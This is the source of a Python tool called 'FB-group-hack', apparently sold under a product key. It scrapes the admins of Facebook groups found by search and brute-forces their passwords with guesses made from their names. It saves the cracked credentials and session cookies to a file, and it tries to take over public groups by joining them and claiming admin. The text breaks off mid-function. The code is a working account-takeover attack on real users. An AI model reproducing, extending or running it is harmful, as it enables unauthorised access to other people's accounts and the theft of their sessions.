import threading
from cryptography.fernet import Fernet
import queue,os,platform
import requests
from bs4 import BeautifulSoup
from http import cookies
import sys
import time
from colorama import Style,Back,Fore
import json
from _strptime import _strptime
from datetime import datetime
import colorama
import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)

gone=1
threadlock=threading.Lock();
processes=100
import asyncio
import re
workq= queue.Queue()
state=queue.Queue()
qdat=queue.Queue()
sesq=queue.Queue()
colorama.init()
colorama.ansi.clear_screen()


def findid(id):
    err=0
    id=str(id)
    try:
        file_open=open("FB_ACCOUNT_LIST.txt","r")
    except:
        return 0
    r=file_open.readline()
    while r:
        try:
            fid=getid(r.strip())
            if fid==id:
                return "ban"
        except:
            err=err
        r=file_open.readline()
    file_open.close()
    return "pass"

def getid(jid):
    jid=json.loads(jid)
    jid=jid["cookies"]
    for para in jid:
        if para["name"]=="c_user":
            return para["value"]



def countid():
    err=0
    cid=0
    try:
        file_open=open("FB_ACCOUNT_LIST.txt","r")
    except:
        return 0
    r=file_open.readline()
    while r:
        try:
            fid=getid(r.strip())
            if fid:
                cid+=1
        except:
            err=err
        r=file_open.readline()
    file_open.close()
    return cid

def getcid(kid):
    ret=0
    for id in kid.split("\n"):
        try:
            j=json.loads(id)
            j=j["cookies"]
            for i in j:
                if i['name']=="c_user":
                    ret=i['value']
                    break
        except:
            u=0
    return ret
def cojson(cookie):
    dicc={}
    acok=[]
    cookie=cookie.split(" ");
    cok='{"url":"https://m.facebook.com","cookies":[{"domain":".facebook.com","name":"datr","value":""},{"domain":".facebook.com","name":"c_user","value":""},{"domain":".facebook.com","name":"xs","value":""}]}'
    cok=json.loads(cok)
    for k in cok["cookies"]:
        for i in cookie:
            i=i.split(";")
            i=i[0].split("=")
            try:
                if i[0]==k['name']:
                    k['value']=i[1]
                    acok.append(k)
                
            except:
                ui=0
    inl=acok
    acok={}
    acok['url']="https://m.facebook.com"
    acok["cookies"]=inl
    return json.dumps(acok)


def sclr():
    if platform.system()=='Windows':
        os.system('cls')
    else:
        os.system('clear')
def usid():
    jn=""
    jn1=""
    jn2=""
    for word in platform.uname():
        jn=jn+str(word)
    for wd in jn:
        if wd==" ":
            wd='#'
        if wd=="@":
            wd='*'
        if wd==".":
            wd='&'
        if wd==",":
            wd='!'
        jn1=jn1+wd
    jn1=sorted(jn1)
    for srtd in jn1:
        jn2=jn2+str(srtd)
    return jn2

print("\033[37;36m")
print("User id: \033[37;35m"+str(usid()))
print("\033[37;36m")
def verifykey():
    gm=45
    itn=0
    head={}
    head['user-agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    head['accept-encoding']='gzip'
    url='https://m.facebook.com'
    key=b'sybkBMLKio0NWEZ3IYTC1O9dZItuXtbTrkcFszBXms4='
    try:
        file=open("access.key","r")
        user_key=file.read()
        file.close()
        if str(user_key)=="empty":
            gm=1
    except:
        gm=0
    if gm==1 or gm==0:
        user_key=input("Enter Product Key: \033[37;35m")
    mainkey=user_key
    device_key=usid()
    ext=False
    coue=0
    user_key=user_key.encode()
    fer=Fernet(key)
    try:
        user_key=fer.decrypt(user_key)
        access=json.loads(user_key.decode())
    except:
        print('InValid Product Key')
        print("Contact Techboy237 With Your User_Id on Telegram Via the Link https://t.me/Techboy237")
        print("Or Email:[techboy237.cm@gmail.com] To Get a Valid Product Key")
        exit()
    while 1:
        try:
            coue=coue+1
            if coue==10:
                ext=True
                print("\033[0;31mAuthentication Error")
                print("\033[0;36mPlease Make Sure Your Have An Active Internet Connection")
                itn=1
                exit()
            fd=requests.get(url)
            fd=fd.headers['Date']
            fd=fd.split(' ')
            m=_strptime(fd[2],"%b")
            h=fd[4].split(':')
            fd=datetime(int(fd[3]),m[0][1],int(fd[1]))
            ud=access['datetime']
            ud=ud.split('-')
            ud=datetime(int(ud[0]),int(ud[1]),int(ud[2]))
            if str(access['device'])!=str(device_key):
                print("\033[0;31mThe Loaded Key Was Not Created For Your Device!")
                print("\033[0;36mContact Techboy237 With Your User_id Via the Link https//t.me/Techboy237 For Help!")
                ext=True
                file=open("access.key","w")
                file.write('empty')
                file.close()
                exit()
            if fd>ud:
                print("Product Key Expired")
                ext=True
                file=open("access.key","w")
                file.write('empty')
                file.close()
                exit()
            if not ext:
                print("\033[0;36mSuccess! Access Has Been Granted")
                print("Valid Still: \033[0;33m"+access['datetime'])
                file=open("access.key","w")
                file.write(mainkey)
                file.close()
                break
        except:
            if ext==True:
                exit()
                

verifykey()

print("\033[0;32m")

import re, os, sys, time, random, json, uuid, base64, rich, requests, platform, hashlib, string, logging, subprocess
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from datetime import datetime, timezone, timedelta
from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree

from menu import Natural

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m'
O = '\x1b[1;36m'
N = '\x1b[0m'
Z = "\033[1;30m"
FM = '\033[0;41m'


class YoWaimo:
    def __init__(self, o):
        self.o = o   

    def logo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        os.system("clear")
        print(f"{B}╔══════════════════════════════════════════╗{B}")
        print(f"{B}║{B}  Author   : {M}Techboy237                   {B}║{B}")
        print(f"{B}║{B}  Telegram : {B}https://t.me/AlphaTech237    {B}║{B}")
        print(f"{B}║{B}  Telegram : {B}https://t.me/techboy237      {B}║{B}")
        print(f"{B}║{B}  Version  : {H}4.9                          {B}║{B}")
        print(f"{B}╚══════════════════════════════════════════╝{B}")
        print(f'      {M}》{H}》{B}》{H}FB-group-hack{B}《{H}《{B}《')
        print("")

    def linex(self):
        print("%s════════════════════════════════════════════%s\n"%(Z,N))



    def __init__(self, o):
        self.ses = requests.Session()
        self.idd, self.con = [], 0
        self.ber, self.gag = [], []
        self.die, self.pri, self.ser = 0, [], o
        self.url = "https://m.facebook.com"
        try:self.cookie = {"cookie": open(".cok.txt", "r").read()};self.nama, self.user = open(".tok.txt", "r").read().split("|")
        except (FileNotFoundError, ValueError):self.hapus();self.login()

    def hapus(self):
        try:os.remove(".cok.txt")
        except:pass
        try:os.remove(".tok.txt")
        except:pass

    def login(self):
        self.logo()
        cok = input(f"{K} [?] COOKIES : {H}")
        if cok in ["", " "]:print("\n[!] CAN'T BE LEFT BLANK!");time.sleep(2);self.login()
        dat = Natural("").login_cookie({"cookie": cok})
        Natural("").pause(f" [{H}+{N}] CHECKING COOKIES..", 3)
        print("")
        if "berhasil" in dat["stat"]:
            open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(dat["nama"]+"|"+dat["user"])
            print(f" LOGIN SUCCESSFUL MR. {dat['nama'].upper()}\n")
            exit(f"[{M}!{N}] RUN AGAIN python techboy237-fb-group-hack.py")
        elif "checkpoint" in dat["stat"]:
            print(f"\n\n[{M}!{N}] YOUR ID HAS GONE TO CHECKPOINT:(");time.sleep(2);self.login()
        elif "invalid" in dat["stat"]:
            print(f"\n\n[{M}!{N}] INVALID COOKIES");time.sleep(2);self.login()
        else:
            print(f"\n\n[{M}!{N}] INVALID COOKIES");time.sleep(2);self.login()


    def menu(self):
        self.logo()
        data = Natural(self.cookie).login_cookie(self.cookie)
        if "berhasil" in data["stat"]:pass
        else:self.hapus();print(f"\n\n[{M}!{N}] YOUR ID HAS GONE TO CHECKPOINT:(");time.sleep(5);self.login()

        print(f"""
{H} [+] NAME : {self.nama}
{K} [-] UID : {self.user}{N}

{H} [1] CRACK GROUP ADMIN
{K} [2] DUMP GROUP ID
{B} [3] CLAIM PUBLICK GROUPS
{Z} [4] DELETE ALL GROUPS
{M} [0] DELETE COOKIES\n""")
        pil = input(f"{K} \>> ")
        if pil in ["", " "]:print("[!] can't be left blank");time.sleep(2);self.menu()
        elif pil in ["1", "01"]:self.crack_admin()
        elif pil in ["2", "02"]:self.carii_group()
        elif pil in ["3", "03"]:self.mulai_nuyul()
        elif pil in ["4", "04"]:self.dump_join()
        #elif pil in ["5", "05"]:Natural(self.cookie).menu_Natural(self.cookie).lain()
        elif pil in ["0", "00"]:self.hapus();Natural("").pause(f" [{H}+{N}] DELETING COOKIES", 5);exit(F"\n{H} [+] SUCCESSFULLY DELETED COOKIES ")
        else:print("[!] wrong input !");time.sleep(2);self.menu()

    def mulai_nuyul(self):
        print(f"\n{K} ENTER THE FILE THAT YOU DUMPED")
        file = input(f"{B} [+] FILE: {H}")
        try:
            self.idd = open(file).read().splitlines()
        except FileNotFoundError:
            exit(f"[!] THE {file} FILE DOES NOT EXIST, PLEASE DUMP IT FIRST.")

        tnya = input(f"{K} [?] DO YOU WANT TO USE ANOTHER ACCOUNT'S COOKIES TO CLAIM THE GROUP? {H}[Y/n]: ")
        if tnya in ["Y", "y"]:
            print(f"\n{K} [!] PLEASE ENTER THE ACCOUNT COOKIES TO CLAIM THE GROUPS")
            kntl = Natural(self.cookie).ganti_akun()
            prints(f"[!] YOU USE THE ACCOUNT [bold green]{kntl['nama'].upper()}[/] TO CLAIM THE GROUP.")
            cook = {"cookie":kntl["coki"]}
        else:
            cook = self.cookie
        self.apaacooaa(cook, file)

    def crack_admin(self):
        print(f"\n{K} USE COMMA (,) TO ENTER MULTIPLE GROUP NAME \n EXAMPLE : Football,PUBG,Messi Fans Club")
        print("")
        nama = input(f"{B} [?] GROUPS NAMES :{H} ").split(",")
        for i in nama:
            print(f"\n {K}[!] PRESS ctrl+C TO START CRACK\n{N}")
            try:self.dump_admin(f"{self.url}/search/groups/?q={i}")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"{M} [!] connection error")
            self.crack_admin_grup()

    def crack_admin_grup(self):
        self.logo()
        print(f"{K} [+] TOTAL ADMIN IDS {H}{len(self.idd)}")
        print(f"{H} [-] BRUTE HAS BEEN STARTED {N}")
        print(f"{B} [+] WAIT AND SEE {H}✘{M}✘ {N}\n")
        self.linex()
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        bool.submit(self.mulai_crack, uid, pwx)
                    except:pass
        print()
        exit(f"{H} GROUP ADMIN CRACK COMPLETE >_")


    def mulai_crack(self, username, pasw):
        prog.update(des, description=f" {Z}[[bold blue]DIEE[/]{Z}]:[bold cyan]{str(self.die)}[/] LIVE:[bold green]{len(self.ber)}[/] CHEK:[bold yellow]{len(self.gag)}")
        prog.advance(des)
        for password in pasw:
            try:
                ses = requests.Session()
                link = ses.get(f"https://web.facebook.com/?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddb916fd5-9b2a-4601-ac5f-1d7251343150%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr")
                data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1), "email": username, "prefill_contact_point": "", "prefill_source": "", "prefill_type": "", "first_prefill_source": "", "first_prefill_type": "", "had_cp_prefilled": "false", "had_password_prefilled": "true", "is_smart_lock": "true", "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), "pass": password, "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), "__dyn": "", "__csr": "", "__a": "", "user": "0", "_fb_noscript": "true"}
                headers = {
"Host": "m.facebook.com",
"content-length": str(random.randint(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(random.randint(8,20))}", "Chromium";v="{str(random.randint(40,114))}", "Google Chrome";v="{str(random.randint(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"viewport-width": "360",
"x-response-format": "JSONStream",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(random.randint(5,12))}.0.0"',
"content-type": "application/x-www-form-urlencoded",
"x-requested-with": "XMLHttpRequest",
"x-asbd-id": "129477",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(random.randint(8,20))}.0.0.0", "Chromium";v="{str(random.randint(40,114))}.0.{str(random.randint(2000,5999))}.{str(random.randint(10,399))}", "Google Chrome";v="{str(random.randint(40,114))}.0.{str(random.randint(2000,5999))}.{str(random.randint(10,399))}"',
"sec-ch-prefers-color-scheme": "dark",
"sec-ch-ua-platform": '"Android"',
"accept": "/",
"origin": "m.facebook.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": link.url,
"accept-encoding": "gzip, deflate",
"x-fb-lsd": data["lsd"],
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6"}
                ses.post("https://web.facebook.com/?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddb916fd5-9b2a-4601-ac5f-1d7251343150%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATAfb4qtOhjw_zvvhX9GumpbxedKK4vlgjre-FeiWlOMUqEJWZLUAp8x51oA-GfILume7-on1arpeaoNDNWY6b3j9BPNFQwwSCp-vwvJm60I81QkoHM3jXzxTePoNgAZ_xyP_-Mu1Fvdzx2nT-1dyaZp53fIF5N77oPXRkbFx32y1YVXZvelHu7zcPk4s4tLaoSYZmkL5Yq1AMSfOvlIDILtGltz7rQyIhq1YOCjb6oOV6hBcSOyw_bbB8aP6PHiIT6NqQUE_zkRs8sjfj6DpJ8bYTHE_XoEP72HbP-2je2P_gmyQs92dH_r-wdMd7YfRxxZhwA8cCfKfs2IoixVledJCY_c5tx8ubp-YAToLAvmmrrLuaEi_pBcw7qgqRzZiStE_E9_dUqw0VI7j3uRFA_MJf_sy1djQ60gznZu43XWr4xy9DyolOyuj5qJpl-Nhfv09M0jbcKAPmJVAAuHp0RaTc49LvWLt_fF4rmGyBmKlmtX0ENqNUzl5UI0-120f5PnNXsCNtUhQA_6tTyHHwF_Kv0aAxM69CgLYvuMdOjqqEIPqB37avReqaB2vhPQVw98zt9WHmmqdTDbZsBAcxnozayCK-GDRgSUrcddJYFFbm2EqBj-i5HN7Q6redBAyqHtMspIwQz9BEA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr",headers=headers,data=data,allow_redirects=False)
                #print(f" {username} | {password}")
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    tree = Tree("")
                    tree.add(f"[bold green]{username}|{password}")
                    tree.add(f"[bold green]{coki}")
                    prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ber.append(kntl)
                    with open("cgf_ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break

                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.gag.append(kntl)
                    with open("cgf_cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[[bold red]SPAM[/]]:[bold cyan]{str(self.die)}[/] LIVE:[bold green]{len(self.ber)}[/] CHEK:[bold yellow]{len(self.gag)}")
                prog.advance(des)
                time.sleep(5)
            except Exception as e:print(e)
        self.die+=1



    def dump_admin(self, url):
        try:
            link = self.ses.get(url, cookies=self.cookie).text
            if "Anda Diblokir Sementar" in str(link):print(f"\n[{M}!{N}] YOU CROSS THE FACEBOOK DAILY ACTIVITY LIMITS, PLEASE SWITCH ACCOUT");exit()
            elif "Perlambat untuk Terus Menggunakan Fitur Ini" in str(link):print(f"\n[{M}!{N}] YOU CROSS THE FACEBOOK DAILY ACTIVITY LIMITS, PLEASE SWITCH ACCOUT");exit()
            cari = re.findall('<a\s+href="([^"]+)"><div class\=\".*?"><div class\=\".*?">([^<]+)</div>', str(link))
            for x in cari:
                if "groups" in x[0]:
                    xx =self.ses.get(f"{self.url}/groups/{re.search('groups/(.*?)/', x[0]).group(1)}?view=members", cookies=self.cookie)
                    if "Admin dan Moderator" in str(xx.text):
                        carz = re.findall('<h3><a class\=\".*?" href="(.*?)">(.*?)</a></h3>', xx.text)
                        for i in carz:
                            if "profile.php?" in i[0]:
                                self.idd.append(re.findall("id=(.*?)&amp;eav", i[0])[0]+"<=>"+i[1])
                            else:self.idd.append(re.findall("/(.*?)\?eav", i[0])[0]+"<=>"+i[1])
                    else:continue
                else:continue
                sys.stdout.write(f"\r{B} [+] DUMPING GROUP ADMINS {B}[{H}{str(len(self.idd))}{B}]{N} ");sys.stdout.flush()
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_admin(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"))
        except:pass


    def carii_group(self):
        print(f"\n{K} USE COMMA (,) TO ENTER MULTIPLE GROUP NAME \n EXAMPLE : Football,PUBG,Messi Fans Club")
        print("")
        nama = input(f"{B} [?] GROUPS NAMES :{H} ").split(",")
        file = input(f"{K} [?] FILE NAME : ")
        print(f"\n {K}[!] PRESS ctrl+C TO SAVE GROUP IDS\n{N}")
        for i in nama:
            try:self.dump_grup(f"{self.url}/search/groups/?q={i}", file)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"{M} CONNECTION ERROR !")
        print(f"\n{K} [+] DUMP GROUP ID SUCCESFUL :)\n{K} [>] DUMP RESULTS SAVED IN >>{H} {file}")

    def dump_grup(self, url, file):
        try:
            link = self.ses.get(url, cookies=self.cookie).text
            if "Anda Diblokir Sementar" in str(link):print(f"\n[{M}!{N}] YOU CROSS THE FACEBOOK DAILY ACTIVITY LIMITS, PLEASE SWITCH ACCOUT");exit()
            elif "Perlambat untuk Terus Menggunakan Fitur Ini" in str(link):print(f"\n[{M}!{N}] YOU CROSS THE FACEBOOK DAILY ACTIVITY LIMITS, PLEASE SWITCH ACCOUT");exit()
            for yxz in re.findall("groups/(\d+)/", link):
                if len(yxz) == 0: pass
                else:
                    if yxz in self.idd: pass
                    else:
                        self.idd.append(yxz)
                        sys.stdout.write(f"\r{B} [+] DUMPING GROUP ID {B}[{H}{str(len(self.idd))}{B}]{N} ");sys.stdout.flush()
                        open(file, "a").write(yxz+"\n")
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_grup(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"), file)
        except:pass

    def apaacooaa(self, cook, file):
        self.logo()
        print(f"{H} [+] GROUP CLAIMING HAS STARTED")
        print(f"{K} [-] TOTAL GROUPS {H}{str(len(self.idd))}")
        print(f"{B} [+] WAIT AND SEE {H}✘{M}✘ {N}")
        self.linex()
        for user in self.idd:
            self.mulai_cari(user, cook)
        print(f"\n\n{H} GROUP CLAIM COMPLETED ^_^")
        hpss = input(f"{K} [?] DO YOU WANT TO DELETE THE DUMP RESULTS ? [Y/n]: ")
        if hpss in ["Y", "y"]:
            try:os.remove(file)
            except:pass
            exit(f"\n\n{H} [-] DUMP FILE SUCCESFULLY DELETED >_.\n")
        else:exit()


    def mulai_cari(self, usr, cok):
        self.con+=1
        print(f"\r{K} RUNNING ID [{M}{str(self.con)}{K}]{N}                                              ", end="\r")
        try:
            apcb = self.ses.get(f"{self.url}/groups/{usr}?view=members", cookies=cok)
            if "Anda Diblokir Sementar" in str(apcb.text):print(f"\n[{M}!{N}] FACEBOOK LIMITS EVERY ACTIVITY, LIMIT BRO, PLEASE SWITCH ACCOUNTS")
            elif "Halaman yang diminta tidak bisa ditampilkan sekarang. Halaman tersebut mungkin tak tersedia sementara, tautan yang diklik mungkin sudah rusak atau kedaluwarsa, atau Anda tidak memiliki izin untuk melihat halaman ini." in str(apcb.text):pass
            elif "Konten Tidak Ditemukan" in str(apcb.text):pass
            elif "Admin dan Moderator" in str(apcb.text):pass
            else:
                user = re.findall("c_user=(.*?);", str(cok))[0]
                link = self.ses.get(f"https://web.facebook.com/groups/{usr}", cookies=cok)
                if 'checkpoint' in str(link):exit("akun anda checkpoint, silahkan ganti akun")
                data = {'av': user, '__user': user, '__a': '1', '__req': '13', '__hs': re.search('"haste_session":"(.*?)"', link.text).group(1), 'dpr': '1.5', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}', link.text).group(1), '__hsi': re.search('"hsi":"(.*?)",',link.text).group(1), '__comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', link.text).group(1), 'jazoest': re.search('&jazoest=(.*?)"', link.text).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"', link.text).group(1), '__spin_r': re.search('"__spin_r":(.*?),', link.text).group(1), '__spin_b': 'trunk', '__spin_t': re.search('"__spin_t":(.*?),',link.text).group(1), 'qpl_active_flow_ids': '431626709', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'CometGroupRootQuery', 'variables': json.dumps({"groupID":usr,"imageMediaType":"image/x-auto","isChainingRecommendationUnit":False,"scale":1.5,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":False,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuSearchBarEnabledrelayprovider":False,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":False}), 'server_timestamps': 'true', 'doc_id': '6182312131895393'}
                head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': link.url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"', 'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.102", "Chromium";v="115.0.5790.102"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'viewport-width': '923', 'x-asbd-id': '129477', 'x-fb-friendly-name': data["fb_api_req_friendly_name"], 'x-fb-lsd': data["lsd"]}
                mmkk = self.ses.post("https://web.facebook.com/api/graphql/", cookies=cok, headers=head, data=data)
                angg = re.findall('{"formatted_count_text":"(.*?)"}', str(mmkk.text).replace("', '", " ").replace("\\u00a0", " ").replace("anggota", ""))[0]
                apaa = re.findall('"text":"Grup (.*?)"}', str(mmkk.text).replace("', '", ""))[0]
                nmgp = re.findall('"name":"(.*?)"', str(mmkk.text).replace("', '", ""))[0]
                if "Publik" in apaa:
                    asuu = self.join_grup(user, data, head, cok, usr)
                    Natural(self.cookie).pause(f"[{M}!{N}] TRYING TO JOIN THE GROUP", 10)
                    if "Batasi" in asuu:
                        exit(f" {K} YOUR ACCOUNT IS LIMITED, PLEASE CHANGE THE ACCOUNT !")
                    else:
                        kntl = self.jadi_admin(user, usr, cok)
                        Natural(self.cookie).pause(f"[{M}!{N}] TRYING TO BE ADMIN", 10)
                        if "Berhasil" in kntl:
                            prints(Panel(f"""[[bold green]•[/]] GROUP NAME: [bold green]{nmgp}[/]
[[bold green]•[/]] GROUP TYPE : [bold green]{apaa.replace("Publik","Public")}[/]
[[bold green]•[/]] MEMBERS  : [bold green]{angg.replace("rb","k").replace(",","").replace(" ","")}[/]
